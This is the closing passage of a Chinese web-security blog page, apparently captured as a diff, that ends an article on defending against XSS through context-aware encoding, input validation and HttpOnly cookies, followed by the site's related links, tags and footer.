+	由于很多地方都可能产生XSS漏洞，而且每个地方产生漏洞的原因又各有不同，所以对于XSS的防御来说，我们需要在正确的地方做正确的事情，即根据不可信数据将要被放置到的地方进行相应的编码，比如放到&lt;div&gt;标签之间的时候，需要进行HTML编码，放到&lt;div&gt;标签属性里的时候，需要进行HTML属性编码，等等。
+</p>
+<p style="text-indent:2em;">
+	XSS攻击是在不断发展的，上面介绍的几条原则几乎涵盖了Web应用里所有可能出现XSS的地方，但是我们仍然不能掉以轻心，为了让Web应用更加安全，我们还可以结合其他防御手段来加强XSS防御的效果，或者减轻损失：
+</p>
+<p style="text-indent:2em;">
+	对用户输入进行数据合法性验证，例如输入email的文本框只允许输入格式正确的email，输入手机号码的文本框只允许填入数字且格式需要正确。这类合法性验证至少需要在服务器端进行以防止浏览器端验证被绕过，而为了提高用户体验和减轻服务器压力，最好也在浏览器端进行同样的验证。
+</p>
+<p style="text-indent:2em;">
+	为Cookie加上HttpOnly标记。许多XSS攻击的目标就是窃取用户Cookie，这些Cookie里往往包含了用户身份认证信息（比如SessionId），一旦被盗，黑客就可以冒充用户身份盗取用户账号。窃取Cookie一般都会依赖JavaScript读取Cookie信息，而HttpOnly标记则会告诉浏览器，被标记上的Cookie是不允许任何脚本读取或修改的，这样即使Web应用产生了XSS漏洞，Cookie信息也能得到较好的保护，达到减轻损失的目的。
+</p>
+<p style="text-indent:2em;">
+	Web应用变得越来越复杂，也越来越容易产生各种漏洞而不仅限于XSS漏洞，没有银弹可以一次性解决所有安全问题，我们只能处处留意，针对不同的安全漏洞进行针对性的防御。
+</p>
+<p style="text-indent:2em;">
+	希望本文介绍的几条原则能帮助你成功防御XSS攻击，如果你对于XSS攻击或防御有任何的见解或疑问的话，欢迎留言讨论，谢谢。
+</p>
+<p style="text-indent:2em;">
+	[感谢<span style="white-space:nowrap;"><a href="http://webappsecuritylab.com/?p=6" rel="nofollow" target="_blank">shineforyou</a>投递</span>]
+</p>
+<p style="text-indent:2em;">
+	<a href="http://www.freebuf.com/articles/web/9977.html" target="_blank">[原文地址]</a> 
+</p>
+<p>
+	<strong>相关内容：</strong> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3611/" target="_blank">XSS解决方案系列之一：淘宝、百度、腾讯的解决方案之瑕疵</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3608/" target="_blank">XSS解决方案系列之二：知其所以然—浏览器是如是解码的</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3607/" target="_blank">XSS解决方案系列之三: 例解过后，再回首您正在维护的产品</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3585/" target="_blank">XSS解决方案系列之四：关于编码</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3610/" target="_blank">防御XSS的七条原则</a> 
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">shineforyou</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2013-06-20
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/xss/">XSS</a>
+          <a href="https://lcx.cc/tags/api/">API</a>
+          <a href="https://lcx.cc/tags/ascii/">Ascii</a>
+          <a href="https://lcx.cc/tags/cookie/">cookie</a>
+          <a href="https://lcx.cc/tags/css/">CSS</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/java/">Java</a>
+          <a href="https://lcx.cc/tags/seo/">SEO</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/web/">Web</a>
+          <a href="https://lcx.cc/tags/%E5%AE%89%E5%85%A8/">安全</a>
+          <a href="https://lcx.cc/tags/%E7%BC%96%E7%A0%81/">编码</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1/">服务</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a>
+          <a href="https://lcx.cc/tags/%E6%94%BB%E5%87%BB/">攻击</a>
+          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
+          <a href="https://lcx.cc/tags/%E8%84%9A%E6%9C%AC/">脚本</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/%E4%BA%8B%E4%BB%B6/">事件</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E5%8D%8F%E8%AE%AE/">协议</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3611/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">XSS解决方案系列之一：淘宝、百度、腾讯的解决方案之瑕疵</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3609/">
+            <span class="next-text nav-default">WAF绕过的奇技淫巧</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
